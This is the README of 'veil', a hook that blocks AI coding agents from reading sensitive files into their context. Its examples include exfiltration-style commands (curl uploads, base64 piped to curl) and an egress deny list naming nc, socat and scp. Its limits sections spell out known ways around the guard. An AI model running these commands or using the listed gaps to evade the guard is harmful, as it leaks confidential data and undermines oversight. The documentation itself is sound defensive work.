# veil

![veil: privacy guard at the read boundary. A painterly dashboard showing a restricted source file (Connections.csv, LinkedIn export) on the left, a refusal artifact and an explicit grant card in the middle, and aggregates flowing to model context on the right. An evidence ledger records both the refusal and the grant with timestamps.](docs/images/veil.webp)

> *The agent asked to read the file. Veil decided what happens next.*

**Data exfiltration guard for AI coding agents.**

A high-performance Claude Code hook that blocks direct sensitive-file reads
into the agent context and steers operators toward authorized local processing
tools, enforcing a clean boundary between orchestration and data access.

`veil` is the preventive companion to `airlock`:

- `veil` blocks raw sensitive data from entering the agent context in the first
  place
- `airlock` proves what derived artifacts later crossed the model boundary

---

## The Problem

AI coding agents can read any file on your machine. When orchestrating data pipelines on sensitive documents, the agent might `cat` a file, use the Read tool, or grep through contents — pulling private data into the prompt, which gets sent to the inference API. This violates zero-retention policies and exposes confidential information.

## The Solution

veil intercepts direct file access attempts before they execute, blocking reads
of sensitive files while allowing authorized processing through spine tools
(`shape`, `rvl`, `profile`, `canon`, etc.) that run as subprocesses and
produce structured metadata — never raw data.

If a downstream workflow later sends derived telemetry to a model, `veil` is
not the proof layer for that step. `airlock` owns that boundary attestation.

```
ALLOW:  shape client_data.csv        → subprocess, output is schema report
BLOCK:  cat client_data.csv          → raw data would enter prompt
BLOCK:  Read tool on client_data.csv → raw data would enter prompt
ALLOW:  Read tool on shape-report.json → derived artifact, safe
```

---

## Quick Install

Homebrew:

```bash
brew tap cmdrvl/tap
brew install cmdrvl/tap/veil
```

Installer script:

```bash
curl -fsSL https://raw.githubusercontent.com/cmdrvl/veil/main/install.sh | bash
```

Or build from source:

```bash
cargo install --path .
```

## Release Automation

Tagged `v*` releases build the four supported tarballs, publish
`veil-<tag>-SHA256SUMS`, then update `cmdrvl/homebrew-tap` from that published
checksum asset. Configure `HOMEBREW_TAP_TOKEN` with write access to the tap
repository before cutting a release. The tap job validates `Formula/veil.rb`,
pushes directly to `main` when allowed, and opens a documented tap PR if branch
protection blocks the direct push.

Signed checksums, provenance attestations, and SBOMs are not yet published with
releases; only the SHA-256 checksum asset above is.

---

## How It Works

veil hooks into Claude Code's `PreToolUse` event for multiple tool types:

| Hook Matcher | What It Guards |
|-------------|----------------|
| `Read` | Direct file reads into context |
| `Grep` | Content-mode grep exposing file contents, including a search of a directory that holds protected paths |
| `Bash` | Common shell-reader patterns that would expose file contents directly, including `grep`, `rg`, `ag`, `ack` and `ugrep` content searches, in every command the line would run (see below) |
| `mcp__.*` | Paths handed to an MCP tool in its arguments, such as a send-mail attachment or an upload path (see MCP Tools below) |

Treat `veil` as an operator-first guardrail: it blocks direct reads, then points
you to the configured authorized path for sensitive-file work instead of
encouraging ad hoc shell commands.

A content search of a directory reads every file beneath it, so veil walks the
directory before allowing it and denies the search when any path under it is
protected by `[sensitivity] protected` or a built-in sensitivity pack. Searches
that return only file names or counts (Grep `output_mode` of
`files_with_matches` or `count`; `grep -l`, `-L`, `-c`, `rg --files`) stay
allowed and are written to the audit log. Two
limits to know about: the Grep tool's `glob` and `type` filters are not
honored, so a search of a directory that holds protected data is denied even
if the filter would have skipped it (search a narrower path instead); and a
directory with more than 200,000 entries is refused rather than assumed clean.
The walk also checks visited paths against the built-in sensitivity packs,
including `.env` and key files. The 200,000-entry limit bounds how many entries
it inspects; it is not a wall-clock latency guarantee, which depends on the
filesystem and tree shape.

A Bash tool call is judged one command at a time, not by its first word. veil
splits the line on `;`, `&`, `&&`, `||`, `|` and newlines, looks inside `$( )`,
backticks and `<( )`, runs the string given to `sh`/`bash`/`zsh`/`dash -c`,
`eval` and here-strings or here-documents fed to a shell back through the same
steps, and looks through `env`, `nice`, `nohup`, `time`, `timeout`, `sudo`,
`doas`, `exec`, `xargs`, `find -exec`/`-execdir`/`-ok`, `uv run`, `uvx`,
`pipx run`, `poetry run`, `pdm run`, `npx`, `bunx` and `deno run` to the command
they run. Every command is evaluated, the first denial wins, and each is
written to the audit log with an `origin` of `top`, `subshell` or `wrapper`.
An authorized spine tool authorizes only its own command: `shape data/a.csv;
cat data/b.csv` still denies the `cat`.

`find data -exec cat {} \;` is treated as a content read of `data`, because the
files `{}` stands for are unknown; `-name`, `-type` and `-prune` filters are not
honored, so it is denied if `data` holds anything protected. What veil does not
follow: a script piped into a shell (`echo '...' | sh`), a `cd` earlier in the
line (paths resolve against the directory the hook started in), and programs
that run a command but are not in the list above (`docker exec`, `ssh host
cmd`, `git grep`). Those are allowed today. A script file an interpreter is
asked to run is read; see [Script Files](#script-files). Variables, `$( )` results, what
`xargs` reads, command text veil cannot parse and anything past the 64th command
of one line or the 8th level of nesting are the dynamic-argument stance's; see
[Dynamic Arguments](#dynamic-arguments).

Each of those commands is then judged by the paths it names, not by whether veil
knows it as a reader. `awk 1 data/x.csv`, `sed`, `jq`, `base64`, `xxd`, `perl`,
`sqlite3`, `duckdb`, `cp`, `mv`, `tar`, `zip`, `rsync`, `scp` and `curl -F
file=@data/x.csv` all name a protected path, and each is denied unless the
command is an authorized spine tool (which may name every path it is given, but
not with a raw-value flag). A word counts as a path when it has a slash or a
data-file extension, when something by that name exists (`shortcut`, a symlink
into `data/`, or `data` itself), or when it sits inside a longer word as the
value of `--opt=` or `key=@`, after a `:` (`git show HEAD:data/x.csv`,
`scp host:data/x.csv`), or between quotes (`select * from 'data/x.csv'`). Naming
a directory to a command that carries whole trees (`cp -r`, `tar`, `zip`,
`rsync`, `scp`, `curl`, `docker`...) is a read of everything beneath it, so
`tar czf out.tgz data` is denied when `data/` holds protected paths; for any other
command a directory is just a name. `cat`, `head`, `tail`, `less`, `more`, `bat`
and the grep family keep their own parsing, so a grep pattern with a slash is
not a path. `/dev` and `/proc` are ignored, except the file-descriptor paths
that stay blocked.

A short list of commands only print names, counts, sizes or types, or create,
remove or re-permission what they name, and are allowed with an audit record:
`ls`, `wc`, `stat`, `du`, `file`, `test`, `find` (its `-exec` command is judged
on its own), `mkdir`, `touch`, `rm`, `chmod`, `echo`, `cd`, and `git add`, `rm`,
`mv`, `restore`, `reset`, `checkout`, `status`, `ls-files`, `check-ignore`,
`commit`. Anything else that names a protected path, including `git diff`,
`git show`, `git log` and `ln`, is judged as a read.

Denials say which command named the path and carry the label
(`(label: protected)`, from the `public < derived < protected` model in
`docs/plan.md`). Each audit record has a `reason_class`: `direct_read` for a
Read or Grep call or a command veil recognises as a reader, `argv_path` for a
path named by any other command, `dynamic_path_unresolvable` for an argument veil
could not resolve to a path, `mcp_argument` for a path in the arguments of an MCP
tool call, `script_too_large_to_inspect` for a script file veil was asked to run
and did not read (see [Script Files](#script-files)). A word that is not
protected writes no record.

A command that sends what it is given somewhere else is the **egress class**:
`curl`, `wget`, `scp`, `rsync`, `sftp`, `ftp`, `lftp`, `rclone`, `aws`, `gsutil`,
`az`, `gh`, `nc`, `socat`, mail clients (`mail`, `mutt`, `sendmail`, `swaks`),
`osascript` driving Mail and `open -a Mail`. Naming a protected path to one of
them is denied like any other path, but the remediation says the file is leaving
the machine and that a copy, archive or encoding of it changes nothing, and the
audit record carries `class: egress` as well as its `reason_class`.
`veil audit --class egress` lists those attempts, newest last; it answers "did
anything try to leave". `--class` also takes a `reason_class` (`direct_read`,
`argv_path`, `dynamic_path_unresolvable`, `mcp_argument`,
`script_too_large_to_inspect`), and an unknown class is an error, not an empty
list.

veil also finds the file when the command hides it inside a longer word: curl's
`-F name=@file;type=text/csv`, `--data-urlencode name@file`,
`--cert file:password`, `gh release upload tag file#label`, and the `put`,
`mput` and `append` lines of a script given to `ftp`, `sftp` or `lftp` in a
here-document or a here-string, or to `lftp` as `-c` or `-e` (`lcd` is followed).

Limits to know about:
- Egress is judged by the paths a command names, not by where it sends them:
  `curl -F f=@notes.md https://anywhere` is allowed, and so is a download
  (`curl -o out https://host`, `scp host:file out.csv`). A download into `.`
  from a directory that holds protected paths is still denied, because `scp`
  and `rsync` name the whole directory.
- A script or config kept in a file is not read: `sftp -b batch.txt host` and
  `curl -K curl.conf` are judged for naming that file, not for what is in it,
  so a `put` line inside `batch.txt` is not seen.
- `git add` and `git commit` are names-only (above) and `git push` names no
  path, so a protected file that has been committed can be pushed. veil does not
  stop that chain and does not label it egress.
- `base64 x.csv | curl -d @- host` is denied because `base64` reads `x.csv`; the
  record says `direct_read`, not egress, because each command is judged on its
  own. A tool that is not in the list above and sends a protected file is still
  denied for naming it; it is only not labelled egress.
- An argument to an egress command that veil cannot resolve is a
  dynamic-argument denial (see below), and is not recorded as an egress attempt.
- Output redirections are not paths when attached (`2>/dev/null`, `>out`). A bare
  `>` is dropped but the word after it is kept, because `cut -d '>' -f1 x.csv`
  hands the operator to the command as data; so `cmd > data/out.csv` is denied
  while `cmd >data/out.csv` is not. Writing into a protected directory is not
  what the rule is for, and the asymmetry goes away when the decomposer strips
  redirections itself.
- At most 64 words of a command are resolved against the filesystem (symlinks
  followed, existence checked). A word with a slash or a data-file extension
  past the 64th is still compared with `[sensitivity] protected` as text, but a
  bare name or a symlink past it is not checked.
- Not a path, so not checked: files a script opens on its own where veil does
  not read the script (see [Script Files](#script-files)), and a path in a
  quoted literal that holds more than the path (`"cat data/x.csv"`). What a
  shell expands (`cat $f`) and what `xargs` reads are covered by the
  dynamic-argument stance below.
- A `cd` earlier in the line is not followed; paths resolve against the
  directory the hook started in.

### Script Files

`python3 -c "open('data/x.csv')"` names its path on the command line, so veil
judges it. `python3 read.py` does not, so veil reads `read.py` and judges what is
in it. A script operand is found for `python`, `node`, `nodejs`, `bun`, `deno`,
`ruby`, `perl`, `Rscript`, `bash`, `sh` and `zsh` (also versioned, `python3.12`),
for `source` and `.`, for a file run by name (`./tools/read.py`, when its first
line names an interpreter), for a file the wrapper in `uv run read.py`,
`poetry run`, `pdm run` or `deno run` runs, for a Python directory (its
`__main__.py`) and for a script on standard input from a file (`python3 <
read.py`). Options before the script (`python3 -W ignore -u read.py`) are
skipped. The file is judged under the working directory the command runs in.

What is judged depends on the language:

- Python, JavaScript and TypeScript, Ruby, Perl and R: the file opens and reads
  veil recognises are judged like the same code given to `-c` or `-e`, and every
  quoted word that looks like a path is judged like a word on a command line. A
  path the script builds from literals is worked out: `os.path.join("data",
  "clients", "x.csv")`, `Path("data") / "clients"`, `BASE + "x.csv"`,
  `f"{BASE}/x.csv"` and `` `${BASE}/x.csv` `` (with `BASE` assigned a literal
  once), and the same for the Node `path.join`, Ruby `File.join` and R
  `file.path` forms.
- Shell scripts: the text is run back through the same steps as a Bash
  command, so each command in it is judged, and a script it runs is read in
  turn. A word a shell script expands (`"$1"`, `"$SRC"`) is not judged; the
  caller's arguments are not known when the script is read.

A denial names the script the path was found in, and an audit record for it has
`origin: script`. A script that is itself under a protected path is denied for
being named and is not read, so its contents do not reach a reason.

veil reads scripts as text. That is best effort, and only an OS sandbox is
airtight. It does not see:

- a path built at run time: from the environment, a file, user input, a network
  call or a module the script imports (imports are not followed);
- a script that arrives through a pipe (`cat read.py | python3`), a module run
  with `-m`, a zip, a `.pyc` or any binary;
- a script written by an earlier command of the same line (it does not exist
  when veil looks), or changed between the hook and the run;
- a directory entry point other than a Python `__main__.py`.

It also errs the other way. A path named in a comment or a docstring is judged
like one in code, so `# was data/clients/x.csv` is denied.

A script veil cannot read in full is not guessed at. The limits are 256 KiB for
one script, 16 scripts, 1 MiB of script text and 3 levels of one script
running another for one Bash call; the work done reading a script is bounded
too. A script past a limit is judged like a recursive copy of the directory it
runs in: if anything protected is within reach, it is denied with
`reason_class: script_too_large_to_inspect`; if nothing is, it is allowed and
the audit log records that it was not read. `veil audit --class
script_too_large_to_inspect` lists them. Under `[policy] default = "warn"` or
`"log"` a denial is an allow with its reason, as for every other class.

Two costs follow. A bundled script over 256 KiB (a minified Node bundle, for
instance) that runs from a directory holding a protected path is denied, and
there is no setting for the limit yet. Split the script, move it out of reach of
the protected path, or run the work through an authorized spine tool.

### MCP Tools

Claude Code fires `PreToolUse` for the tools an MCP server provides
(`mcp__<server>__<tool>`) as well, and a send-mail or upload tool takes the path
of a file as a string argument. `veil install` adds a hook for `mcp__.*`. veil
then reads every string in the tool's arguments and judges the ones that name a
path the way it judges a word of a command, for a tool that is not an authorized
spine tool: a protected path is denied (or warned about, as `[policy] default`
says). The reason names the tool and the field, as a JSON pointer:
``(argument `/attachments/1`)``. The audit record carries the tool's own name
(`mcp__mail__send_email`) and `reason_class: mcp_argument`, and
`veil audit --class mcp_argument` lists them.

A string names a path when

- it is rooted (`/abs/x`, `~/x`, `file:///x`) and has no whitespace: it is judged
  whether or not the file exists, as a word of a command is; or
- it is anything else (a relative name, or text with spaces) and a file of that
  name exists in the working directory. A symlink counts, and is followed.

So `"path": "data/x.csv"` is judged when that file is there, and
`"note": "see data/x.csv for the numbers"` never is: veil does not look inside a
string for content. A URL is not a path (`https://host/x.csv`, `s3://b/k`), and
numbers, booleans and object keys are not judged. Arguments nested more than 32
levels deep, or holding more than 10,000 strings, are denied, because veil
cannot show that nothing in them is protected; the remediation says to send less.

`[mcp] screen = false` turns this off (MCP tool calls are then neither judged nor
recorded). `[mcp] ignore_tools = ["mcp__crm__*"]` exempts tools whose arguments
are known not to be paths, by exact name or by a prefix ending in `*`; an entry
that could never match (one that does not start with `mcp__`) is a config error.
Like every setting, both can be set in a project `.veil.toml`, which overrides
the user's.

An install made before MCP screening has no `mcp__.*` hook, so MCP tool calls
never reach veil. `veil doctor` reports that as the `mcp_hook` check (an `error`,
exit `1`) until `veil install` is run again. Operator commands are not refused
for it: their preflight still needs only the Read, Grep and Bash hooks.

Limits to know about:
- A directory argument is judged as a path, not scanned: an MCP tool handed the
  project root, which holds a protected file, is allowed. A tool that walks the
  directory it is given can read that file.
- A relative name resolves against the agent's working directory. An MCP server
  running elsewhere may resolve the same string to another file.
- A path built inside a string is not found: `"--file=x.csv"`, `"a.csv,b.csv"`,
  `"@x.csv"`, a percent-escaped `file://` URL. A file id that is not a path is
  not a path.
- veil judges what the agent hands the tool, not what the tool does: a tool that
  reads a protected file on its own, without being given its path, is not seen.
- Only `mcp__*` tools are routed to veil. `WebFetch`, `NotebookRead` and the other
  built-in tools that are not Read, Grep or Bash are not.
- Each string that is not rooted costs one `lstat`, so a call with 10,000 such
  strings takes 50 to 75 ms in a debug build; 10,000 distinct rooted paths take
  about 450 ms, because each goes through the full path evaluation.

### Dynamic Arguments

veil judges the paths a command names, so a command whose arguments a shell
fills in later (`cat $f`, `cat $(ls)`, `ls | xargs cat`, `cat file{1..100}`) has
paths veil cannot see. This is the one place veil fails closed by design: an
argument it cannot resolve to a path is a reason to deny, not to allow.

veil first resolves what it can from the command text: simple assignments
(`f=.env; cat $f`, `export F=.env`), `$HOME`, `~` and `$PWD`, brace lists, quote
removal, ANSI-C strings (`$'.e\x6ev'`), and `for f in a b c; do cat $f; done`,
which judges every word of the list. A name is trusted only when it is assigned
once in the command string. A name that is assigned twice, appended to (`+=`), or
set by `read`, `select`, `mapfile`, `getopts`, `printf -v` or a `for` with no list
is unknown, and `$PWD` is unknown after a `cd`. An unresolved word is then
judged by what the command is:

- A reader (`cat`, `head`, `tail`, `less`, `bat`, the grep family), a content
  filter (`awk`, `sed`, `jq`, `cut`, `sort`, `base64`, `xxd`, `diff`,
  `sqlite3`...), a bulk transfer (`cp`, `mv`, `tar`, `rsync`, `scp`, `curl`,
  `aws`, `docker`...), a program that is itself a variable or `$( )` result, and
  text veil cannot parse or that is past the 64th command or 8th level of
  nesting, is denied for any unresolved word, in any directory. For the readers
  veil parses, only a word in a place that names a file counts: `grep "$p" file`
  and `head -n $n file` are allowed, `cat $f` and `grep pat $f` are not.
- Any other command is denied only in a protected context: when the directory it
  runs in is inside a `[sensitivity] protected` root or one a built-in pack
  recognises (`~/.ssh`, a credentials directory), or when an assignment in the
  command names a protected path or a directory inside one. `echo $x` and `make
  $target` run freely elsewhere.

A denial says `dynamic_path_unresolvable` in its audit record and asks you to
rewrite the command with a literal path. Set `[policy] dynamic_args` (or
`VEIL_DYNAMIC_ARGS`) to change it: `deny` (the default) blocks, `warn` allows
and writes the finding to the audit log only (the agent is not told), `allow`
does not judge unresolved arguments at all. A path the command names outright is
judged as before whichever value is set.

False positives, measured. Replaying the 24,842 distinct (command, directory)
pairs the agent ran over 30 days, read from session transcripts because the audit
log does not keep command text, 679 of the 24,681 that the previous release
allowed (2.75%) are denied now. Of the 681 denials that `dynamic_args = allow`
would lift, 672 are an unresolved argument to a reader, filter or bulk transfer,
5 are text veil cannot analyse and 4 are a string that assigns a protected path.
By the shape of the unresolved word: 533 a variable the command never assigns,
116 a `$( )` result, 13 names `xargs` reads, 14 other. By program, `aws` (168),
`sed` (133), `grep` (120), `rg` (36), `cat` (34), `curl` (29), `jq` (15), `cp`
(13) and `cmp` (12) lead. `aws`, `sed`, `curl`, `jq`, `cp` and `cmp` are 370 of
them: veil has no parser for which of their words is a file, so any unresolved
word counts, and teaching it each command's grammar is how that number falls.
The history is one machine's, replayed against a scratch home with the default
configuration, so read it as the cost on that history and not a prediction for
another.

An `export` (or `declare -x`) of a protected path is judged as naming it: the
value reaches every program after it, and veil does not read what they do with it.

What this does not do: a path handed to one program through a prefix assignment
(`F=data/x.csv ./run.sh`) is not followed into that program; `cd` earlier in the
line is not followed, so `cd data && cat $f` resolves against the starting
directory; a script that computes its own paths is not read; `find . -exec cat {}
\;` and `grep -r` of a directory holding only a pack-recognised file such as
`.env` are allowed (see the directory-scope note above); and a `$VAR` set in the
caller's environment before the hook runs is unknown, so `cat $HOME_FILE` is
denied even when the variable is harmless.

`[sensitivity] protected` patterns are held in an index (names, a trie of path
components, and globs filed by a literal part they must contain), so a lookup
costs the depth of the path rather than the number of patterns. With 10,000
patterns, 64 lookups take about 60 µs in a release build, against about 27 ms
for trying every pattern; building the index once per hook call takes about
5.6 ms. The index answers exactly what trying each pattern in turn answers, and a
differential test checks that on random patterns and paths. Judging a command that
names 64 files (the most one command gets resolved) takes 0.75 to 1.06 ms in a
release build on the machine it was measured on, and a command that names two
files takes about 80 µs; with 10,000 patterns the index build brings the 64-file
command to about 4.5 ms.

### Audit Log

With `audit_log = true` veil appends one line of JSON per path it judged to
`audit_path` (`~/.cmdrvl/logs/veil/audit.jsonl` by default). A command veil
recognises as a reader (`cat`, `head`, `grep`...) records the file it read, allowed
or denied; a path named by any other command is recorded when it is protected.
A redirection and its attached target (`2>/dev/null`, `>out.txt`, `2>&1`) are never
recorded as paths, however they are glued to the word before them
(`cat x.csv>out.txt` reads `x.csv`).

- **Schema.** Every record carries `"schema_version": "veil.audit.v1"`. Records
  written before it have no such key and fewer fields; anything that reads the log
  should treat a record without it as legacy.
- **Whole lines.** A record is written with a single `write`, so hooks running at
  once cannot write into each other's lines. A log from an older veil can hold
  lines where that happened.
- **Reading.** `veil audit` lists the newest entries and skips lines that are not
  audit entries, saying how many (`skipped_lines` in `--json`). `veil audit
  --validate` counts every line as `current`, `legacy` (readable, no
  `veil.audit.v1`) or `unparseable`, and lists the first 20 unparseable line
  numbers; `--json` prints the same as a document. It reports and exits 0: read
  `unparseable` to decide. It takes no `--class`.
- **Rotation.** When the log reaches 10 MiB the next write moves it to
  `audit.jsonl.1`, each older file up one place, and keeps five. **The oldest is
  deleted.** `audit.jsonl.lock` next to the log serialises that between hooks. A
  failed rotation does not lose the record being written; the hook says so on
  stderr with the rest of its audit errors. The size and the five are fixed, and
  `veil audit` reads only the current file, so entries just before a rotation are in
  `audit.jsonl.1`.

### Configuration

```toml
# .veil.toml (project root) or ~/.cmdrvl/config/veil/config.toml

[sensitivity]
# Paths that are sensitive (glob patterns)
protected = [
    "data/clients/**",
    "filings/**/*.xml",
    "*.nport.xml",
    "exports/*.csv",
]

[spine]
# Spine tools allowed to process sensitive files as subprocesses
authorized_tools = [
    "shape", "rvl", "vacuum", "hashbytes",
    "fingerprint", "profile", "canon", "lock", "pack",
    "verify", "assess", "benchmark", "airlock",
]

[spine.denied_flags]
# Raw-value flags that turn an authorized spine tool into a reader
# (`shape --explicit x.csv` prints raw values). An invocation that uses one,
# as `--flag` or `--flag=value`, is denied on protected paths. Defaults shown.
default = ["--explicit", "--raw", "--dump", "--show-values"]
# A tool-named key adds flags for that tool only; it never drops the default.
# profile = ["--values"]

[policy]
# Require a healthy dcg companion guard for operator commands (default: false)
require_dcg = false

[allowlist]
# Files always safe to read
safe_patterns = [
    "*.md", "*.toml", "*.lock",
    "docs/**", "tests/**", ".github/**",
    "*-report.json", "*-report.yaml",
    "package.json", "tsconfig.json",
    "Cargo.toml", "Cargo.lock",
]
# NOTE: *.json and *.yaml are NOT safe by default.
# Files like credentials.json, secrets.yaml, service-account.json
# are common sensitive targets. Allowlist specific filenames instead.

[policy]
# What to do when veil detects a sensitive access
# (either a classified-sensitive file anywhere, or any unknown file inside an
# explicitly protected directory)
default = "deny"           # deny | warn | log
audit_log = true           # Log all access attempts
audit_path = "~/.cmdrvl/logs/veil/audit.jsonl"  # default; outside repo
# What to do with a command whose arguments veil cannot resolve to a path
# (see Dynamic Arguments). Also set by VEIL_DYNAMIC_ARGS.
dynamic_args = "deny"      # deny | warn | allow

[mcp]
# Judge the paths in the arguments of an MCP tool call (see MCP Tools).
screen = true              # false: MCP tool calls are not judged
# Tools whose arguments are never judged: an exact name or a prefix ending in *.
ignore_tools = []          # e.g. ["mcp__crm__*"]
```

veil also ships a built-in CMD+RVL config-protection profile. Direct content
reads under the canonical `~/.cmdrvl/` config and secret-bearing subtrees are
denied by default, including `config/`, `secrets/`, guard receipts, Gmail watch
state, holon doctor runs, receipts, migration records, and deprecation notices.
That profile is preserved when user, project, or environment protected patterns
are supplied.

`veil` configuration intentionally contains no secret-valued fields. Do not put
API keys, tokens, or cloud secret references in `veil` config files; unknown
sections such as `[secrets]` are rejected instead of ignored. Because `veil`
does not require config-file secrets, it does not need an AWS Secrets Manager
or SSM Parameter Store adapter.

### Operator Discovery

When `veil` blocks a direct read, use the configured authorized path instead of guessing:

```bash
veil doctor triage --json
veil capabilities --json
veil --describe
veil --schema
veil robot-docs guide
veil operator
veil operator --json
```

`veil doctor triage --json` is the fastest read-only machine entrypoint: a
`cmdrvl.doctor.v1` report with health findings and `next_actions`.
`veil --robot-triage` is its deprecated alias and prints the same document.
`veil --describe` and `veil capabilities --json` print the same `operator.v1`
manifest (the repository's `operator.json`): commands, exit codes, environment
variables, side effects, hook-mode expectations, and composition boundaries.
`veil --schema` prints the JSON Schema for hook-mode stdout (the permission
decision). `veil robot-docs guide` prints the agent-facing quick guide.

`veil operator` reads `[spine] authorized_tools` from the active config, runs
`--describe` on each installed tool, and prints a combined reference with any
missing or broken tools called out explicitly.

### Path Decisions for Wrappers

A local wrapper that wants veil's decision about a path, such as an attachment
about to be sent, can run `veil test <path> --json`, `veil explain <path> --json`
or `veil scan <dir> --json` and parse stdout; it never needs to read stderr.
Every document carries `"schema_version": "veil.path-decision.v1"`:

```json
{
  "schema_version": "veil.path-decision.v1",
  "input_path": "data/holdings.csv",
  "normalized_path": "/repo/data/holdings.csv",
  "decision": {
    "action": "deny",
    "reason": "direct read of a path matched by data.tabular is blocked by policy default",
    "severity": "high",
    "confidence": 0.95,
    "remediation": "Direct read blocked. Run `veil operator` ..."
  }
}
```

`explain` adds a `match` object (`kind`, `pack`, `protected_pattern`,
`allowlist_pattern`, `severity`, `confidence`, `directory_sensitive`), and
`scan` returns `{ "schema_version", "root", "files": [...] }` with one
`input_path`/`normalized_path`/`match`/`decision` entry per file. An allow or a
deny exits 0, so read `decision.action`. When no decision can be made (an
unusable path, or a guard preflight refusal) the command exits 2 and prints
`{ "schema_version": "veil.path-decision.v1", "error": { "code", "message" } }`
on stdout, with `code` one of `path_unnormalizable`, `guard_preflight_refused`
or `error`.

These are decisions about paths. veil does not read file contents or message
bodies to make them, so an `allow` says nothing about what a file or a message
says. Screening the body of an outbound message is a separate surface; see
"Boundary With Outbound Screening".

### Doctor Mode

`veil doctor` is read-only. It inspects local configuration, the audit path, and
managed Claude Read/Grep/Bash hook state, and the `mcp__.*` hook that screens MCP
tool calls, without installing hooks, rewriting
settings, appending audit records, or using the network.

```bash
veil doctor                       # human report
veil doctor --json                # cmdrvl.doctor.v1, mode "health"
veil doctor capabilities --json   # mode "capabilities" (embeds the operator.v1 contract)
veil doctor triage --json         # mode "triage" (adds next_actions)
veil doctor robot-docs
```

Exit codes: `0` healthy, `1` unhealthy (at least one `error` finding), `2` usage
errors only. The older spellings `veil doctor health [--json]`,
`veil doctor --robot-triage` and `veil --robot-triage` still work: they print the
same documents (`--robot-triage` is `doctor triage --json`) and exit by health.
Their JSON now uses the `cmdrvl.doctor.v1` schema; consumers should key on
`schema_version`. The previous `veil.doctor.*.v1` identifiers are gone, and the
old `contract` string field is now `read_only_contract`.

No `doctor --fix` mode is available yet. Any future repair mode must ship with
detector, backup, inverse, fixture, and undo coverage before it is exposed.

Bare `veil` is hook mode for Claude/Gemini/Copilot settings and expects a hook
payload on stdin. Run with a terminal on stdin, or with empty stdin, it exits
`2` immediately with pointers to `veil --help` and the discovery commands rather
than waiting for input. For operator discovery, use `veil --help` or the
surfaces above instead of running bare `veil`.

### Operator-First Workflow

When a sensitive-file read is blocked:

1. Run `veil operator`.
2. Pick the authorized spine tool that matches the job.
3. Produce metadata or other derived artifacts through that tool instead of
   reaching for a direct read.
4. If those derived artifacts later go to a model, use `airlock` to attest the
   model boundary.

### Decision Pipeline

```
File access attempt (Read/Grep/Bash)
    │
    ├── Allowlist check → safe pattern? → ALLOW (silent)
    │
    ├── Protected-dir / sensitivity check
    │       │
    │       ├── Is this a spine tool subprocess? → ALLOW (audit log)
    │       │
    │       └── Direct read into context? → policy default (deny|warn|log)
    │
    └── Unknown file outside protected dirs → ALLOW
```

### Default Stance

- Unknown file outside `[sensitivity] protected` directories is allowed.
- Unknown file inside a protected directory is treated as sensitive and resolved through `[policy] default`.
- Classified-sensitive file anywhere is resolved through pack-specific rules or `[policy] default`, with direct reads denied by default.
- Operator/domain commands run a harness-aware guard preflight:
  - Under **Claude Code**, they fail closed unless the active Claude `PreToolUse`
    settings contain healthy `veil` Read/Grep/Bash hooks. The `mcp__.*` hook
    is not a precondition: `veil doctor` reports it, operator commands do not
    refuse for it.
  - Under **Codex, Gemini CLI, Cursor, or a plain shell/CI sandbox**, Claude
    settings are not consulted; veil reports its hook wiring as `unverified`
    rather than blocking.
  - `dcg` is optional. Set `[policy] require_dcg = true` to require it (a
    Bash PreToolUse hook under Claude Code, an executable on `PATH` elsewhere).
  - The harness is detected from its environment markers; set `VEIL_HARNESS`
    (`claude-code`, `codex`, `gemini-cli`, `cursor`, `plain`) to override.
  - `veil doctor --json` and `veil doctor triage --json` include a
    `guard_posture` object showing the harness, veil-hook and dcg status, and
    any blockers.
  - `veil doctor`, `veil install`, and `veil uninstall` remain available as
    guard-maintenance commands when the preflight is failing.

---

## Pairs With

| Tool | Role |
|------|------|
| **dcg** | Blocks destructive commands (git reset, rm -rf) |
| **veil** | Blocks data exfiltration (reading sensitive files) |
| **airlock** | Proves what derived artifacts crossed the model boundary |
| **post-compact-reminder** | Re-reads AGENTS.md after context compaction |
| **spine tools** | Authorized processing path for sensitive data |

---

## Architecture

veil is modeled after
[dcg](https://github.com/Dicklesworthstone/destructive_command_guard) and
shares key architectural patterns:

- **Layered configuration:** project > user > system > defaults
- **Fail-safe design:** budget exceeded → allow with audit log
- **Sub-millisecond latency:** fast-path glob matching with early exit
- **Multi-protocol support:** Claude Code, Gemini CLI, Copilot
- **Rich denial output:** explains why, suggests alternatives
- **Audit trail:** every access attempt logged with timestamps

## Relationship to Airlock

`veil` and `airlock` are complementary, not competitive.

```text
raw sensitive files
  -> veil / local read guard
  -> authorized spine subprocesses
  -> derived telemetry artifacts
  -> airlock assemble / verify
  -> model request
```

- `veil` is a host-side prevention tool. It decides whether the agent may read
  a file or invoke a shell command that would expose raw contents.
- `airlock` is a model-boundary proof tool. It decides what claim can be made
  about the exact prompt and request bytes that crossed to a model.
- `veil` does not emit boundary manifests or prove model cleanliness.
- `airlock` does not stop a local agent from `cat`-ing a file before prompt
  assembly.

That split matters. `veil` protects the local working environment. `airlock`
attests the model boundary.

## Boundary With Outbound Screening

`veil` is a path guard, not an outbound disclosure policy engine.

It can decide whether an agent may read a local path, grep file contents, or run
a shell reader that would expose raw sensitive bytes. It can also help wrappers
preflight attachment paths before send-time workflows hand those files to an
email or chat client, and it refuses a protected path handed to an MCP tool in
its arguments (see MCP Tools).

It does not decide whether an outbound message body is safe, complete,
appropriate for a counterpart, or compliant with a relationship-specific
disclosure profile. That belongs in the calling wrapper and, later, an external
send-policy / disclosure service that owns counterpart identity, authorization,
approval state, and send-path policy.

Use the split this way:

- `veil`: block raw local reads and screen referenced file paths.
- calling wrapper: classify outbound intent, recipient, approval context, and
  body text.
- external send-policy / disclosure service: enforce account, counterpart, and
  disclosure policy before a send action is allowed.

Do not extend `veil` into a generic outbound content moderator. If the outbound
body is already in the agent context, `veil` is no longer the right abstraction.

---

## Two Operating Modes

### Normal Mode (95% case)
Agent orchestrates spine tools directly. `veil` blocks direct file reads. Spine
tool output is redacted by default (`--explicit` to show raw values). If any
derived telemetry later goes to a model, pair this with `airlock` for boundary
proof. Good for most sensitivity levels.

### Zero-Retention Mode (100% case)
Agent never touches documents. It writes a deterministic pipeline script that the client deploys on their own machine. Claude's job ends at code generation. No veil needed — the agent never runs on the same machine as the data.

---

## License

MIT

---

*`veil` is part of the open-source toolchain from the [CMD+RVL](https://cmdrvl.com) lineage and AI enablement practice. MIT-licensed. Contributions welcome from any practice or stack.*
